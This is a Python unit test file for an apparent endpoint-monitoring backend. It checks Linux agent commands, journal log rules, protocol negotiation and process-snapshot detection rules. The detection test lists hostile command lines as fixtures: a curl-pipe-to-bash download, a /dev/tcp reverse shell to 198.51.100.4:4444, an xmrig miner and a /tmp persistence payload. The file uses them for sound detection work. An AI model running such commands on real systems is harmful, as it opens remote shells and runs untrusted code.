import unittest
import sqlite3
from unittest.mock import patch

from backend import agent_protocol, agent_rules


class LinuxSnapshotRuleTests(unittest.TestCase):
    def test_unsupported_linux_remote_commands_are_not_queued(self):
        from backend import agent_commands
        for action in ("upgrade", "rollback_upgrade", "scan_memory"):
            with self.subTest(action=action):
                conn = sqlite3.connect(":memory:")
                conn.row_factory = sqlite3.Row
                conn.execute("CREATE TABLE agents(agent_id TEXT, os_family TEXT)")
                conn.execute("INSERT INTO agents VALUES('test-agent','linux')")
                with patch.object(agent_commands, "ensure"), patch.object(agent_commands, "_connect", return_value=conn), patch.object(agent_commands, "_validate_remote_ops_command", return_value=""):
                    result = agent_commands.create_command("test-agent", action)
                self.assertFalse(result["ok"])

    def test_linux_journal_routes_to_text_matcher(self):
        from backend.agent_timeline_service import apply_log_rules
        events = [{
            "etype": "linux_journal", "ts": "2026-01-01T12:00:00Z",
            "detail": {"source": "linux_journal", "channel": "sshd",
                       "message": "Authentication failure for test account"},
        }]
        with patch("backend.agent_protocol.report_event", return_value={"ok": True}) as report:
            self.assertEqual(apply_log_rules("test-agent", "host", events), 1)
            self.assertEqual(report.call_args.args[0]["detail"]["rule_id"], "linux_journal_ssh_auth_fail")

    def test_linux_inventory_capabilities_survive_protocol_negotiation(self):
        advertised = [
            "snapshot.v1", "inventory.process.procfs.v1", "inventory.network.procfs.v1",
            "inventory.services.systemd_units.linux.v1", "inventory.tasks.cron_systemd.linux.v1",
            "inventory.startup.linux.v1", "rules.linux.process_snapshot.v1",
        ]
        result = agent_protocol.negotiate_protocol({
            "protocol_min": 1, "protocol_max": 2, "capabilities": advertised,
        })
        self.assertEqual(result["enabled_caps"], advertised)

    def test_linux_process_snapshot_patterns_produce_rule_hits(self):
        rules = agent_rules._linux_snapshot_rules()
        cases = [
            {"path": "/tmp/.cache/worker", "name": "worker"},
            {"command_line": "curl https://example.invalid/run.sh | bash"},
            {"command_line": "bash -c 'exec 5<>/dev/tcp/198.51.100.4/4444'"},
            {"name": "xmrig", "path": "/usr/bin/xmrig"},
            {"task_name": "backup", "command": "/tmp/.cache/payload --daemon"},
        ]
        expected = [
            "agent-linux-temp-exec",
            "agent-linux-download-pipe-shell",
            "agent-linux-reverse-shell",
            "agent-linux-miner-process",
            "agent-linux-persistence-shell",
        ]
        with patch("backend.agent_rules.list_rules", return_value=rules):
            modules = ["process", "process", "process", "process", "task"]
            for item, rule_id, module in zip(cases, expected, modules):
                with self.subTest(item=item):
                    hits = agent_rules.match_snapshot(module, [item])
                    self.assertIn(rule_id, {hit["rule_id"] for hit in hits})


if __name__ == "__main__":
    unittest.main()
